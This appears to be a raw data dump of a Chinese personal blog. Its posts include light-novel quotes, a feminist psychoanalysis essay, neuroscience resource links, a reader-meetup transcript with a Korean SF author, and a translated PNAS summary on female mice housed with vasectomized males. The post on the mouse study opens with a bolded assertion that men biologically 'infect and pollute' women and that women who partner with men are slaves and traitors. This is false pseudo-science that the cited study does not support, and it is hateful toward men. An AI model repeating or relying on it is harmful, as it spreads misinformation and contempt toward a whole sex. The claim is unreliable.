——关于食人之物\n\n原帖：https://tieba.baidu.com/p/6057013919?pid=124470890136&cid=0#124470890136\n\nb站方便阅读：https://www.bilibili.com/read/cv2235353/\n\n关于补记的解读。\n\n\n\n##### 句子\n\n>    ‘凪，你怎么看待普通这件事？’\n>\n>    我觉得他不知所谓。所以摇了摇头。然后他这么说。\n>\n>    ‘普通就是放手不管并且一直维持这种样子。所以，我很讨厌普通，必须变得不普通。所以，我——’\n>\n>    结果，这就是他的遗言。他失去了意识，没有再醒过来。死因是胃穿孔引起的内脏溶解——死得很恶心。医生剖开他的肚子时，里面臭的很厉害，据说跟他非常熟悉的护士都吐了。\n>\n>    所以该怎么说呢，我也不太懂。从那之后，我就放弃了普通的生活方式。”\n>\n>    她淡淡地说。\n>\n>    我没有说话，只是沉默着。而她突然说。\n>\n>    “弥赛亚情结。”（译注：MessiahComplex，即救世主意识。）\n>\n>    “……是吗？”\n>\n>    只看面容她是位文静的美女，我盯着她薄薄的嘴唇。不知怎么我无法直视她的眼睛。\n>\n>    “啊啊。我是有病的。幼儿体验也够多的了。”\n>\n>    她若无其事地说出恐怖的事。\n>\n>    但是我只把她看成是偏执狂。\n\n> \n\n##### MISIC\n\n“Echoes” by Pink Floyd：https://music.163.com/song?id=2016710373&userid=272232716\n\n看到评论区有人提到《2001太空漫游》，只能说，太像了。一个1968一个1971~呼呼，都是上个世纪的，我现在听起来是不是也算文艺复兴呢？\n\n瓦格纳：歌剧《纽伦堡的名歌手》：https://music.163.com/playlist?id=28674823&userid=272232716（p.s.瓦格纳，希特勒最喜欢的作曲家之一。）\n\n\n\n#### 第二卷：VS Imaginator Part I “SIGN”\n\n\n\n##### 补记——堕落与幻灭之间\n\nhttps://www.bilibili.com/read/cv2235505/?spm_id_from=333.999.0.0\n\n\n\n##### 句子\n\n###### 序章\n\n> “小宫同学，在这个世上，没有什么事是绝对的。一切都是不确定的，不管发生什么都不会不自然’…有时小鸟会从天上落下，四月也会下雪。”\n\n###### 第一章\n\n> ```\n> 如果你想做个善良的人，就不要顾及未来。\n> 因为在大多数情况下，你只会走向扭曲的方向。\n> ——雾间诚一《VS幻想者》\n> ```\n>\n> \n\n> “就算进入了一流大学，烦恼也不会消失，也不能保证将来的幸福。认真努力进入大学后却不知道该做什么，一片茫然的人有根多，因为他们只知道学习，不知道还能做其他的什么事。因为不知道做什么，就以参加一级公务员考试为目标，毫无意义地缩窄了自己的前途。即使面前出现应当爱上的人，也不会觉察到对方的价值，在不彻不间失去重要的事物。”\n\n> “即便待在大学里，心情也跟高考生一样。能够直率地接受这一点的人太少了。大多数人都会堕落。然后再次成为流浪者。将宝贵的青春在流浪中度过，精神也变得乖张起来——”\n\n> “你好像不知不觉已经知道了这一点。即使如此还是不想考虑这些，拼命努力。但是一一努力跟把视线从现实中移开是两回事。不要勉强自己，这种话在现在的考试体制中也说不出口。不十分努力就无法合格。但是，即便如此对它的成果期望过高也不好。我接下来的说法可能很陈旧，进入大学并不代表人生。你的阴影之梦是在无意识的情况下对于‘进入大学’‘略有期待’这件事产生了发自心底的暗示。我认为你应该冷静下来。”\n\n> 但是，这孩子心中有种“为什么我没有决定性的出众之处呢？'的想法。有时看到一无所有的人拥有其实无所调的热情时，就会十分困惑。她会羡慕得不得了一一也一直拥有这种烦恼。\n\n<u>也是我2019年初的困惑。某个领域的深度以及对其爆发宗教狂热般的热情。</u>\n\n> “正确来说应该是‘显现于现在的未来’。或者该说是‘建立于可能性假说之上的实体化’。”\n\n###### 第二章\n\n> ```\n> 恋爱是人类的自由。\n> 但我只会祈祷它不要让人们毁灭彼此的精神。\n> ——雾间诚一《VS幻想者》\n> ```\n\n###### 第三章\n\n> ```\n> 不要再怀疑自己的工作了。\n> 无论是多么没有意义、没有价值的工作，坦减面对自已的工作铁是如此才是正确的做法。\n> ——雾间诚一《VS幻想者》\n> ```\n\n> 但是一一过去的我差点被陌生人杀掉，而我却是在一切都结束之后才知道真相一一就因为这样，我一直渴望着一件事。\n> 跟“黑暗”正面相遇并“对决”。\n\n###### 第四章\n\n> 为何畏惧黑暗？\n> 生活本身就是“前路漆黑”。\n> ——雾间诚一《VS幻想者》\n\n###### 第五章\n\n> ```\n> 想变轻松很容易。失去灵魂即可。\n> ——雾间诚一《VS幻想者》\n> ```\n\n###### 第六章\n\n> ```\n> 解除所有混乱的说法是不正确的。\n> 有时混乱只是直接成为了稳固的存在，制约着这个世界。\n> 正如缺乏理论背景，却依然能够发挥效果的诅咒一般……\n> ——雾间诚一《VS幻想者》\n> ```\n\n> ​    说实话，我读过很多关于异常心理的书，却完全不理解自杀者的心理。\n> ​    那些书里当然也记载着对自杀未遂的生还者的访谈。但是，那些只不过是“没有死成”的人所说的话。而且，这些人之后多半没有再次挑战自杀，而是继续生存下去。\n> ​    真正死去的人肯定有着决定性的不同。即使有那种心中重复着未遂行为，最终真的死去的作家，也是坦诚地写“我其实不想死，只是为了配合对方的执着”。最后此人真的死去，好像也是因为自杀未遂的演练失败了而已。\n> ​    从本质上来说，真正自杀死去的人是不会留下遗书之类重要信息的一一我不禁这样认为。\n> ​    水乃星透子又是如何呢？\n\n> ​    “哎呀，我很清楚不能说只要活着，一切都会顺利这种简单的结论。但是，该怎么说呢，即使你死了，你憎恨的东西，还有无论如何也无法原凉的事都绝对无法从世间消失。也就是说，该怎么讲好呢末真喋喋不休地说着，不知何时已经来到附近。\n> ​    她猛地抓住绮的手臂。\n> ​    绮看着她用力的手，又看向她的脸。\n> ​    “——死了也没用。我只想说这些。”\n\n> “不过呢，他好像总给人一种‘杀手’啊‘死神’之类的印象。而言之就是‘青春期'。因为自己很不安定，就干脆把一起都破坏掉一类似于这样的心情。或者说是想要杀人的心情。”\n\n> “大人总是不负责任地说‘不安定仅限于这段时期。他们很快就冷静起来’之类的。其实没有那么简单。”\n\n>  “不吉波普。就是为此而存在。守护无法冷静的心，让它保持原状。我是这么认为的。…不过，相信他的存在也可以说是一种幸福吧。”\n\n> “人类是绝对不可能在不被任何人讨厌的情况下活着的。”\n\n> “他是个小说家，不过我完全没有读过他的小说。此人曾经在他的书中这么说。\n>  …确实存在想要别人‘必须如何'的人。这些人混入了人群之中，总有一天会在世间声张自我。”\n> 末真流利地背出书中一个小节。她自己认为这很正常，但是流利背出这种内容正是别人认为她奇怪的原因，只不过本人还没有自觉。\n> “…人类的一生倘若想要拥有某种价值，就只有跟那种人战斗。跟取代了自己，思考伟大之事的幻想者进行对决的VS幻想者一一这才是人类最先身处的位置。’\n> …就是这样。不过呢，虽然我啰里啰嗦地说了这么多，简而言之就是，人类会在拥有自觉的前提下，受到世间常识这道枷锁的束缚，从而感受到痛苦。”\n> “枷锁…”\n> “没错。如果被束缚住，就必须从中逃脱。他就是这个意思吧。”\n\n> “虽然我这样说真的有些装腔作势，不过，你多半是缺乏‘战斗的念头吧。没有这种念头可不行哦。”\n\n后记——怪异且流行之物\n\n> 不过所谓的“偷工减料”其实就是“适当地放弃已经教条化的过去，开拓通往未来的可能性”。\n\n> 流行文化最棒之处在于无论如何都很难成为权威。不能说是完全不存在，但几乎没有。\n\n> 不过，即便如此，我还是要以流行为目标。这已经成为了我的人生命题，因此我也无可奈何。我这样做的产物总是有些不吉（怪异），虽然想说不是我的错，但果然还是我不对…即使如此，我还会坚持下去。我相信总有一天，怪异且流行之物也会成为真正的流行。\n\n\n\n\n\n#### 汉化资源\n\n*github.com/sw-meteo/boogiepop*\n\n英译：https://www.threatstotheworld.com/main-novels\n\n2024.01.19：今天上贴吧看到了有人搬运，似乎还有英译版本，令人无语的是，第九卷的汉化依然是无。到这个程度我自己都想试试把英译的汉化过来了啊啊啊啊啊啊（原帖：https://tieba.baidu.com/p/8352039280?pn=1）\n\n","tags":["阅读","科幻","随笔"],"categories":["碎碎念"]},{"title":"TPCP10-note4&6","url":"/2024/01/04/TPCP10-4精神分析疗法/","content":"\n### 基于弗洛伊德人格结构、荣格集体无意识分析女性以及母系的记忆\n\n众所周知，弗洛伊德人格结构理论有三元素，分别是自我、本我和超我。\n\n本我与无意识和压抑的内容有关系，那些无意识它更接近人的本能与欲望，或者说最原始和自然的状态，也就是所谓的“自然女”意识状态。被压抑的内容包括真实的女本位，**祂**们被超我的父权规训着约束着凝视着，久久不得释放。\n\n超我来源于母父以及社会对女性的期许。超我的作用从来都是抑制本我的冲动。但女性的本我也就是女本位并非是错误与不好的，相反，**祂们**是女性们力量与生命力的来源，也是生本能的源起。\n\n自我是平衡本我与超我之间的一道杠杆，而大多数女性的这个系统并没有很好的工作。良好的自我系统运作，应该是可以在超我（社会期许）压抑下仍然能保持女本位的意识。\n\n我们一出生就受着这种来自于超我的错误规训，大多数女性的超我都是超负荷工作，并且将本我压抑得很彻底。自我大多数时候根本无法平衡这两者。为什么？因为本我从小应该是被好好爱护的状态，但是出生起就开始经历被摧毁，被摧毁多了，潜藏在女性深处的本我残存着仅剩的意志反抗着，最终得到觉醒。这也是大家为什么说“觉醒”二字，觉醒就是觉醒女性真实的本我。\n\n当女性的本我被不良压抑过后，这也是女性整体丧失某种生命力和力量感的原因，更不提为什么抑郁症、焦虑症发病女性比例比男性多。男性的超我并没有这么严峻地考验与冲突。\n\n荣格提到过一个很有趣的概念——集体无意识。我们女性也是有着这样的天赋与能力，只是藏在无意识中，大多数时候无法被我们察觉到。但是目前越来越多的女性在觉醒，我们试图唤醒其她人的集体无意识。\n\n**祂是什么？祂来自于我们每个女性的无意识中，来自于我们的DNA与染色体中，更是隐藏在上万年前那个时代遥远文明的传说与历史中。**\n\n在过去被压抑的时代，或者从出生开始，女性就活在一个错误的文明以及父权的压抑下，女性出生便会将这种女本位以及生命力或者神性忘记。但是她们从出生到死亡的最后一刻都会时不时浮现那些冥冥来自于“本我”的指引。是否会做出行动，做出什么决定，采取什么样的措施，隐藏在那些传承中。现在是时候去做出行动了！去颠覆整个世界，整个秩序，整个文明，将火种传承下去，播撒到世界各地，乃至宇宙，去生出新的希望。\n\n<embed src=\"./4 精神分析疗法.pdf\" width=\"100%\" height=\"1000\" type=\"application/pdf\">\n<!-- 在线显示PDF --> \n\n <!-- 第一种方式，可调整pdf显示的大小，比较灵活 --> \n\n第六章笔记：\n\n\n\n<embed src=\"./Ch6 Existential Therapy.pdf\" width=\"100%\" height=\"750\" type=\"application/pdf\">\n","tags":["阅读","隐藏内容","心理咨询"],"categories":["碎碎念"]},{"title":"神经科学相关资料","url":"/2023/11/13/神经科学相关资料/","content":"\n包含在线预览PDF可下载\n\n\n\n## PDF: Neuroscience: exploring the brain 4th\n\nhttps://zlib.pub/book/neuroscience-exploring-the-brain-3907ac6nrmi0 （需要翻墙下载）\n\n<embed src=\"./neuroscience-exploring-the-brain.pdf\" width=\"100%\" height=\"1000\" type=\"application/pdf\">\n\n## Coursera: Computational Neuroscience 华盛顿大学\n\nhttps://www.coursera.org/learn/computational-neuroscience\n\n## PDF: Theoretical Neuroscience (Dayan&Abbott)\n\nhttps://boulderschool.yale.edu/sites/default/files/files/DayanAbbott.pdf\n\n<embed src=\"./DayanAbbott.pdf\" width=\"100%\" height=\"1000\" type=\"application/pdf\">\n","tags":["PDF","计算神经科学","资源"],"categories":["科研"]},{"title":"Vision01","url":"/2023/11/04/Vision01/","content":"\nThis is a new book that I am reading. I have written a note about it.\n\n<!-- 在线显示PDF --> \n\n <!-- 第一种方式，可调整pdf显示的大小，比较灵活 --> \n\n\n\n<embed src=\"./Vision01.pdf\" width=\"100%\" height=\"750\" type=\"application/pdf\">\n\n","tags":["笔记","PDF","计算神经科学"],"categories":["科研"]},{"title":"20231022金草叶读者见面会问答部分","url":"/2023/10/22/20231022金草叶读者见面会问答部分/","content":"\n10月22日 金草叶读者见面会部分\n\n问：如果在短篇小说集只能选择一个故事的话会选择哪个故事推荐给读者呢？\n\n春：我会选择原作在第一篇，翻译版本放在比较后面的，朝圣者。我非常喜欢这个故事，因为我非常喜欢女孩的形象，因为她寻找自己的母亲，寻找自己祖母的生活经历，她来到地球，这是一个寻找自己的文化渊源，同时又不会忘记自己的梦想的这样一个非常执着的人物角色。我很喜欢这个故事，我想把它改成电影剧本，我和我的编剧朋友去讨论，但是我的编剧朋友很喜欢另外一篇，叫馆内遗失，她就把那篇改了一下。因为这个事情我们两个之间还有了一点点小矛盾，我们两个想法不一样，但是只能做同一件事情，如果两个人做不同的事情就会增加难度。但是后来我还有一些其他的工作，所以耽误了一下，没有进行下去了。我们后面仍然会努力去把这两个故事影视化。所以如果是我个人选的话会选择朝圣者。\n\n金：（韩语）\n\n春：这个我来讲吧。韩国读者选出来的最受欢迎的一篇是《光谱》，是中文版本的第一篇。这个在原书排的是比较后面的。但是我们的编辑老师，还有我们的科幻世界总编，特别喜欢《光谱》这一篇，希望我们的读者在翻开这本书的第一眼先看到《光谱》这一篇，所以把它调到了前面，当然也经过了作者老师的同意。然后在韩国影视化的时候，光谱这一篇是最先卖出了影视版权，目前正在拍电影，就是金宝拉导演。蜂鸟的金宝拉导演。所以在不久的将来，今年或者明年初，就会有可能与大家见面，大家可以多多关注一下。但是其实作者本人，和读者的选择会有一点点差别。她最喜欢的一篇应该是共生假说。她觉得在所有这里面这是她写作时最享受的一篇，同时也没有什么创作的烦恼，比如说是有时候写着写着写不下去了，或者头痛啊或者苦恼或者有压力。作者说写这篇的时候，完全没有上述感觉，非常流畅，像在跟一个人讲故事一样，一下子就写下来了，是一个很愉快的著作经历，所以她最喜欢共生假说。\n\n夏：其实，其实我本人最喜欢的也是《光谱》，但是刚刚已经介绍过了。所以我就推荐另外一篇，就是关于我的太空英雄。因为我觉得关于我的太空英雄，金草叶老师写了非常独特一段的一对女性关系，她写了两代女性不同价值选择。可能作为上一代的姨妈，去出走，去反抗体制，最终一跃进入大海，获得了真正的自由。女主作为下一代的女性，她还是选择在这个系统内，通过自己的努力，选择与其他宇航员竞争，最终她一步一步到达那里。她最后也说，可能最终到达黑洞的另外一边，也会发现那里的风景不过如此，但是她也会跟她的姨妈说，我终于到达这里了。我觉得金草叶老师写了两代女性的价值选择的时候，她并没有去做一种审判，就是哪一种是更正确的选择。她给两代女性都有可以自己选择的空间，并且我觉得她们最后都是在自己的立场上实现了自己的人生价值。所以从这篇故事可以看出，金草叶老师对女性是有一种，发自内心的关怀，所以我非常非常的感动。\n\n问：谢谢刚刚三位老师的回答，在金草叶老师的故事中，时常会给读者心灵有一个很大的震撼。在刚刚提到的故事中你们认为主人公打动你们的特质在哪儿呢？\n\n金：（韩语）\n\n翻译：关于这个问题呢，金草叶老师想从两个方面来阐述。第一个是一种好奇心，对一些事情她的孜孜以求的好奇心。第二个呢，是永远不言放弃，也不屈服，她要以自己的一种立场或者以自己的想法，去实现她的梦想。\n\n春：我就接着继续讲，我喜欢她的作品也是同样的原因。她作品里的女性都是非常自主自立，能够知道我需要什么，然后并且为了我自己的梦想去努力奋斗。但是大家可能不知道金老师年纪，她年纪不大，她出版这本书，大概是2017年2018年的样子，她就是二十岁出头。那我自己的经历，我二十多岁还是被困在一个家庭中，道德枷锁或者社会对我的一些规则，受到了很大的局限，就是没有那么勇敢的做我自己。但是当我到了35岁以后，刚好我就看到了她的书，那我觉得她作为一个年轻的女性，她远远比我在这个时候要优秀的多，她非常的自立，她又很强悍。她作品里的人物，其实她作品里很少有男性出现，偶尔会有，但是那些男性都是非常不友好的。他们会攻击你，但是她里面的女性人物都没有屈服，都直接地说你去刚她也好，我把我自己变得更加强大也好，但是我不会害怕你，我要勇敢地去斗争，为了我们自己，为了我们女性去斗争。这种精神，她也激励了我，更加坚强地，正确地认识到我自己。因为我觉得我现在就四十岁嘛，可能我的四十多岁到五十岁的这十年，她的作品激励了我，我可以更加坚定自己前面未来的路，所以最打动我的一点所在。\n\n夏：刚刚老师讲的是我的太空英雄这篇是吧。我觉得太空英雄这篇除了崔在景出走的精神之外，她也有脆弱的时候，情绪不稳定的时候，但是在那种人性的角度下，她不是那种面面俱到的，一致特别刚强的那种。在这种人性的角度下，依然有自己的价值坚持，就比如说，不管是在太空英雄下崔作为大龄宇航员有很多自由，背弃了社会赋予她的责任。可能这是社会层面上觉得她的缺陷，但是，她是一个生动的人，包括其他故事也是，在《我们无法与光速前进》里一个年长的女性，她是离经叛道的，她是不讲道理的，她就是会为了自己的价值选择，会选择自毁式的，追寻那么一趟。我觉得金老师她非常非常会写人，非常非常会写女性，也非常非常会写弱者，就是三者在她笔下都是共通的。这就是她笔下人物最打动我的一点。\n\n问：想知道金草叶老师是怎么挖掘，那些角色动人地另一面的呢？\n\n金：（韩语）\n\n翻译：我们可以看到金草叶老师描述这个光，黑暗与光影之间的一个对比，是非常明显的。核心的一个思想是可以看到描写世界末日，人文尽头，这样相对悲观的一些情愫在里面，但是金草叶老师希望我们人类的存在来讲，去唤醒世界当中的一些光明，照亮我们未来，她希望在我们心中，用一句不忘初心，不忘来时路，能够让大家去迎接更多的光明。\n\n问：《馆内遗失》的结局是母女和解，母女之间是否有更多可能性的结局？\n\n金：（韩语）\n\n翻译：写作这篇故事她更多着墨于现实的问题，她希望基于现实的情况下，可以延申出来更进步的，更深的想象和思考在里面。\n\n问：金老师写作两本书之间是否有思想上的转变？因为可以看到长篇小说更专注女性自身。\n\n金：（韩语）\n\n春：她想说她第一部作品（长篇小说）的时候，因为是一个共同体，一个女性的组织，一个女性互助的组织，因为女性之间有能够共情。其实男性他哪怕是你的父亲，你亲的哥哥，你亲弟弟，哪怕是你自己的儿子，可能你给他们说这些事情，他都不会懂，她觉得很矫情对不对。但是只有我们女性能够互相的明白你为什么这样痛苦。其实她觉得，大家都被这个社会规则教化了之后呢，其实你受到这些，你受到伤害，你可能就没有那么敏感，你可能会理所当然，哎反正大家都这样，都这么做嘛，那我没办法。但是她在第一部作品里呢，其实就是想通过这样一个女性的互助组织，增加我们女性的集体的力量，然后跟一些社会规则做抗争。但是其实读者的一些反应，包括作者自己看到的一些社会上的现象，她又发现，女性共同体只是女性自己的努力，我们女性也不可能说完全的去团结，也会有矛盾，或者有些不足的地方。所以她在写地球尽头温室的时候就会有这样一个反思，说那我就让这个故事里面这个女性共同体破裂掉，就会有一些问题，或者塌了，合作不起来了。但是我们通过这样一种失败的经历，我们来找我们自己的问题，那大家彼此更多的去理解去和解。最后我们再联合起来，我们能够变得更加的强大，所以这就是针对于作者她认为温室比光速进步的地方。\n\n读者提问：您曾经提到创作时不会想象特定人物的长相，那可以谈谈您认为什么样的小说可以不描写特定人物的长相？\n\n金：（韩语）\n\n翻译：首先金草叶老师想澄清一点，她在写作创作的时候的她的立场和倾向性。和其他的作者不同，金老师在描述一个故事的时候她聚焦在故事的情节和人物事件上，而不是刻画人物具体的外貌长相。剩下的可以留给读者自己想象。\n\n问：最适合影视化的作品是什么？我是文科生又热爱文学，金老师有没有想给我们所有的女性什么寄语？\n\n金：（韩语）\n\n翻译：第一个问题，是《太空英雄》。这部小说的题材比较广阔宏大，可以用影视手法表现出来，视觉上会感觉很强烈。第二个问题的回答，她希望如果周围的人如果有人说你这个人很奇怪，很怪异的话，不要去理会他。因为这恰恰说明你身上的闪亮点，是你独有的符号。通常来说，优秀的女性在她成年之前，作为一个小女孩她可能会经常听到这样的话，但是金老师希望大家不要在意这些杂言碎语，要做真实的自己。\n","tags":["阅读","科幻","见面分享会"],"categories":["碎碎念"]},{"title":"pikachu靶场通关.pdf","url":"/2023/09/12/PDFpikachu/","content":"\n<!-- 在线显示PDF --> \n\n <!-- 第一种方式，可调整pdf显示的大小，比较灵活 --> \n\n\n\n<embed src=\"./50.pdf\" width=\"100%\" height=\"750\" type=\"application/pdf\">\n\n","tags":["笔记","靶场","PDF"],"categories":["学习"]},{"title":"某个科学实验-小鼠相关","url":"/2023/08/27/支持性别分离的科学实验-小鼠相关/","content":"\n（这是关于性别分离理论的实际依据）\n\n**男性这种生物挨着女性都是对女性的感染和污染，与男性交配的女性就会像被病毒或者细菌感染后，整个人生物意义上会发炎或者发胖，原因是激素分泌以及精液对女性的感染，此女性情绪也会处于一种不安或者恐惧的状态，整个人会变得越来越混乱。如果你愿意当奴隶，去被感染，去早早死亡，那么你就继续，忽视我说的话，继续你的自杀献祭道理，我不会劝说任何背叛者，别死我家门口。**\n\n\n\n### 在没有受精的情况下交配促进雌性小鼠的生长 - 繁殖与寿命权衡\n\n原文地址：https://www.pnas.org/doi/full/10.1073/pnas.2003159117\n\n#### 研究意义 \n\n怀孕和哺乳耗费大量精力，可能对晚年生殖和寿命产生负面影响。怀孕的雌性必须交配，而这些与雄性的交配互动也可能对雌性的生活史产生长期影响。迄今为止，支持这一预测的证据一直缺乏。在这里，我们表明，允许雌性老鼠在生命早期交配，只与不育的雄性，永久影响雌性生活史和老龄化。交配后的雌性在一生中增加并保持体重，在晚年有更大的繁殖产量，但寿命较短。这些反应解释了先前归因于怀孕和哺乳的一些权衡，并强调仅接触性刺激就可以对哺乳动物的雌性生活史产生重大影响。\n\n#### 摘要\n\n生长、繁殖和寿命之间的权衡限制了动物的生活史，导致不同环境中生活史循环的进化多样化。在雌性哺乳动物中，妊娠和哺乳期预计将增加繁殖的主要成本，推动繁殖权衡，尽管交配也需要与雄性的互动，这可能会影响它们自己的生活史。在这里，我们表明，雄性的存在本身导致终身改变生活史的雌性老鼠。将 C57BL/6J  雌性小鼠与生命早期绝育的雄性小鼠一起饲养，会导致体重增加，这种影响会持续一生，即使后来允许雌性小鼠生育小鼠。我们发现，那些先前与不育雄性同住的雌性在允许繁殖后代时也表现出增强的晚年后代产量，这表明早期交配可以影响随后的生育能力。这种效应与之前雌性动物与完整雄性动物关在一起时的效应相反，这表明了早期生命和晚期生命繁殖之间的预期平衡。然而，在生命早期与不育的雄性住在一起是以寿命为代价的，在没有雌性受精的情况下可以观察到这一点。在内分泌学上，交配也会永久性地降低循环催乳素的浓度，催乳素是一种影响母亲照顾的垂体激素。因此，影响生殖的激素轴的变化可以帮助改变生活史分配，以响应异性刺激。我们的研究结果表明，交配本身可以增加哺乳动物的生长和随后的生殖能力，并且对性刺激的反应可以解释一些通常归因于怀孕和哺乳的寿命权衡。\n\n繁殖是昂贵的，可以权衡寿命，随后的繁殖和晚年生理功能(1,2)。哺乳动物雌性所经历的妊娠和哺乳的巨大能量需求代表了一些最明显的繁殖成本(3,4)。通过胎盘提供给胎儿或通过乳汁提供给新生儿的能量和营养不能再用于其他功能，例如体细胞维持或未来的生殖。怀孕和哺乳对衰老和寿命的生活史影响虽然耗费精力，但通常不能与交配或仅与雄性接触的影响区分开来，因为这种接触与受精同时发生。在这里，我们通过操纵男性与女性受孕或交配的能力，来梳理父母照顾与交配和男性存在的相对影响，从而测试交配/社会互动对生命历史权衡的影响。\n\n有理由相信，社会互动本身可能会影响生活史和老龄化。社会线索对生殖生理有启动效应。在哺乳动物中，这可以影响发情周期和维持或失去怀孕，这取决于父亲或不熟悉的异性暗示的存在(5,6)。单独接触异性气味也可以加速性发育，促进早期生殖的变化，这可能对生命历史的其他方面产生影响。虽然这种生殖生理学的社会调节对哺乳动物晚年表现和衰老的后果尚不清楚，但在短寿命的无脊椎动物中有一些例子，其中寿命可能受到简单的交配行为或信息素暴露的影响(8-11) ，突出了社会线索在调节生命过程中的潜在作用。\n\n为了测试交配本身是否对小鼠的生活史有影响，我们将雌性与28至300天龄的输精管切除雄性配对，使我们能够检查男性存在和交配对随后生活史的影响，而不会混杂女性妊娠和哺乳的影响(图1 A)。切除输精管的雄性会与雌性交配并保持正常的雄性激素水平，但是在射精时不会产生精子。我们还将一个女性子样本与去势的男性配对，使我们能够评估住房与非雄激素化男性的影响，这显示交配行为大大减少(13)  ，雄激素依赖性信号的产生减少(14)。然后将这种异性暴露的生活史后果与没有男性存在的女性以及与完整的假输精管切除男性一起饲养的女性的生活史后果进行对比，这些男性使女性受精，从而诱导怀孕和哺乳。\n\n> 图1.\n>\n> ![image-20221025203108790](../image/image-20221025203108790.png)\n>\n> 女性体重对早期和晚期社会状况的反应。(A)实验设计示意图和实验不同阶段的女性住房伙伴。(B)2至6个月龄的女性体重，当女性与两名女性或与一名女性和一名手术操作的男性一起饲养时。(C 和 D)年龄在12至24个月的女性体重，后来与另一个女性(非生殖)(C)或另一个女性和一个男性(生殖)(D)。数据以平均值 ± SEM  表示。* * * P <  0.005对比之间的女性饲养/先前饲养输精管切除的男性和女性与其他女性(红色星号)或女性之间以前饲养完整的男性和那些以前饲养与女性(绿色星号)。在 D 组，对比度是从整个时间过程中计算出来的，而在 B 组和 C  组，对比度是在治疗效果不同的特定时间计算出来的。在非生殖晚期生活环境中，每个住房伙伴组中 n =  54达6个月，然后每个早期生活组每个时间点18至30，在生殖晚期生活环境中每个早期生活组13至23。\n\n|            实验屋搭档             | 男性存在/女性缺失 | 求爱，强迫，交配 | 怀孕&哺乳 |\n| :-------------------------------: | :---------------: | :--------------: | :-------: |\n|               女+女               |         -         |        -         |     -     |\n|             女+男阉割             |         +         |        -         |     -     |\n| 女+男输精管切除（仍有正常雄激素） |         +         |        +         |     -     |\n|             女+男完整             |         +         |        +         |     +     |\n\n\n\n#### 结果\n\n**早期交配导致终生体重增加。**\n\n与不同社会伙伴一起居住的女性在300天操作期间的体重轨迹不同(时间 × 治疗相互作用: $F_{9,246} = 7.86$，P <  0.001)(图1 B)。在配对后的每个时间点，治疗的总体效果有显著性差异(从2个月开始，P < 0.001)  ，组间差异随着时间的推移而增加。在6个月时，不同社会环境中的女性体重不同(组的总体效应: $F_{3,212} = 160.69$，P <  0.001)  ，女性与输精管切除的男性或完整的男性配对比女性对照重得多(图1 B)。对于与完整雄性一起饲养的雌性，这是可以预期的，因为雌性处于怀孕和哺乳的不同阶段，但是与结扎雄性一起饲养的雌性在6个月大时也比对照动物重20% 。相比之下，与去势的男性配对对体重没有影响与女性-女性对照(P = 0.37)。\n\n在300日龄，原来的住房合作伙伴被删除。来自每个治疗组的一部分女性与女性兄弟姐妹一起维持其剩余生命以评估寿命，而其他人与完整的男性一起居住以评估早期生殖环境对晚期生殖的后果(图1 A)。从12至24个月评估300天后的体重显示，只有当女性保持在生殖条件下(即与完整的男性一起居住) ，而不是当女性居住在非生殖条件下(即与女性一起居住)(早期生活和晚期生殖环境之间的相互作用: F_3,148= 4.09, *P* = 0.008) ，早期社会条件对体重的影响维持到24个月的年龄。在非生殖晚年环境中，早期生活社会环境对体重的影响随着时间的推移逐渐减少(300天前治疗与时间之间的相互作用: $F_{6,182} = 9.44$，P  < 0.001)  ，以前住在不同早期生活社会条件下的女性之间的体重差异在12个月，但在18或24个月时没有显着差异(图1 C)。相比之下，当女性随后与完整的男性一起饲养时，先前在28至300天内与输精管切除或完整的男性一起饲养的那些在剩余的生命期内保持更大的体重(300天前处理与时间之间的相互作用: $F_{6,114} = 1.17$，P = 0.33; 300天前处理对体重的影响从12到24个月: $F_{3,57} = 8.64$，P <  0.001) ，而先前与去势雄性一起饲养时对晚年体重没有显着影响(图1 D)。每组女性的终身体重概况载于http://www.pnas.org/lookup/doi/10.1073/pnas.2003159117#supplementary-materials。\n\n**早期不受精交配提高晚期生殖能力。**\n\n我们评估了早期社会环境对300天后与完整男性居住的女性子集中晚期生殖的影响。在各组中，与完整男性配对后，相似比例的女性产生至少1窝（先前与其他女性一起居住的21人中有17人，先前与输精管切除男性一起居住的20人中有14人，先前与去势男性一起居住的21人中有20人，先前与完整男性一起居住的23人中有19人; $χ^2$独立性检验，$χ^2_{[3]} = 4.53$; P = 0.21）。\n\n为了评估与完整雄性配对的雌性的生殖力，我们分析了那些至少繁殖一次的雌性断奶后的累积后代。我们拟合广义线性混合模型(GLMM)与大坝 ID  作为一个受试者随机效应和笼作为一个随机效应，加上处理作为一个固定的效果和时间自交配开始(在50天箱)作为一个固定的协变量。对于随着时间的推移断奶的后代累计数量，早期社会治疗的总体效应显着($F_{3,66.12} = 6.26$，P = 0.001)  ，但也有显着的时间效应($F_{4,257.45} = 125.33$，P < 0.0001)和时间 × 治疗相互作用($F_{12,257.46} =  6.04$，P < 0.0001) ，表明在以前的社会环境中，配对后随着时间的推移，女性的相对生育力有所不同。\n\n结果表明，配对后50天各处理间断奶后代总数差异无统计学意义(P > 0.05) ，但配对后各处理间断奶后代总数差异有统计学意义(P  <  0.05)。这部分归因于先前与输精管切除雄性一起饲养的雌性比先前与雌性一起饲养的雌性更快产生后代，配对后50-200天断奶的后代明显多于先前饲养的雌性(图2 A)。时间和治疗之间的相互作用也归因于先前饲养完整雄性的雌性的后代生产早期放缓(图2 A) ，与对照相比，这些雌性在最后生殖时显示出较早的年龄(对数秩检验，在不同早期社会环境中饲养的最后一窝的总体年龄差异，P = 0.002;  先前饲养的完整雄性和雌性之间的对比，P =  0.009)(图2 B)。因此，在没有受精的情况下，在生命早期与雄性的相互作用可以提高晚年的生育能力，而受精本身促进了一种权衡，导致早期的生殖衰老。\n\n\n\n> 图2.\n>\n> ![image-20221025205546467](../image/image-20221025205546467.png)\n>\n> 早期的社会条件影响后来的繁殖成功。雌性在300天时与完整的雄性配对，并记录断奶后代的数量。(A)配对后断奶的累积后代。每个误差线表示每个时间点产生的后代的平均数目，> 200 d 表示产生的后代总数。(B)作为配对时间的函数，绘制不同个体最后一窝的生存曲线。(C)产生一定数量的窝所需的时间。(D)每只雌性所产总后代的性别比例，计算方法为断奶雄性数除以断奶后代总数: M/(M + F)。每个点表示不同个体的值。误差线表示平均值 ±  SEM。* P < 0.05; * * P < 0.01; * * * P < 0.005在特定时间点(或 D 中的性别比率) ，对比之前与输精管切除的男性一起饲养的女性和先前与其他女性一起饲养的女性(红色星号)或之前饲养完整男性的女性与之前饲养的女性(绿色星号)。\n\n为了了解这些生殖力差异的原因，我们研究了以前居住在不同社会环境中的雌性小窝重量、大小和频率。处理对产仔数和重量没有显著影响(SI 附录，表 S1和S2 